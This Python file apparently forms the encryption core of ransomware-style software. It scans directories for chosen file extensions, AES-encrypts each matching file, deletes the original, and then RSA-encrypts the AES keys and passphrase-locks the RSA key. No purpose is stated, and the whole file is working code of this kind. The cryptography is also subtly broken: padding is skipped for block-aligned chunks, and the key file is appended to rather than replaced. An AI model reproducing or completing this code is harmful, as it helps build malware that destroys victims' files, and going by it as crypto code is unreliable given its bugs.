import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Cipher import AES


def encrypt_files(key_dict: 'dict[str, bytes]', directories: list) -> None:
    # encrypt each file in each directory with the corresponding AES key
    for key in key_dict:
        for dir_path in directories:
            for file_name in os.listdir(dir_path):
                if file_name.endswith('.' + key):
                    current_file_path = os.path.join(dir_path, file_name)
                    enc_file_path = os.path.join(dir_path, file_name + '.encrypted')
                    encrypt_file_aes(key_dict[key], current_file_path, enc_file_path)

                    print('Encrypting file: ' + file_name)
                    os.remove(current_file_path)


def encrypt_file_aes(key: bytes, current_file: str, encrypted_file: str):
    # get initialization vector
    iv = os.urandom(16)
    encryptor = AES.new(key, AES.MODE_CBC, iv)

    with open(current_file, 'rb') as cf, open(encrypted_file, 'wb') as ef:
        ef.write(iv)

        while True:
            # Reading file in chunks
            chunk = cf.read(64 * 1024)
            if len(chunk) == 0:
                break

            # Adding padding to the last chunk
            elif len(chunk) % AES.block_size != 0:
                padding = AES.block_size - len(chunk) % AES.block_size
                chunk += bytes([padding]) * padding

            # Writing encrypted chunk to output file
            ef.write(encryptor.encrypt(chunk))


def encrypt_aes_keys(key_dict: 'dict[str, bytes]') -> None:
    # Load the private key
    with open('private.pem', 'rb') as f:
        private_key = RSA.import_key(f.read())

    # write the AES keys to a file
    with open('aes_keys_chain.bin', 'wb') as f:
        for key in key_dict:
            f.write(key_dict[key])

    # Encrypt the AES keys file using the private key
    with open('aes_keys_chain.bin', 'r+b') as f:
        data = f.read()
        cipher = PKCS1_OAEP.new(private_key)
        encrypted_data = cipher.encrypt(data)
        f.write(encrypted_data)


def protect_private_key(secret_code: str) -> None:
    # Load private key
    with open('private.pem', 'rb') as f:
        private_key = RSA.import_key(f.read())

    encrypted_key = private_key.export_key(passphrase=secret_code, pkcs=8,
                                           protection="scryptAndAES128-CBC")

    # save encrypted private key
    with open('private.pem', 'wb') as f:
        f.write(encrypted_key)
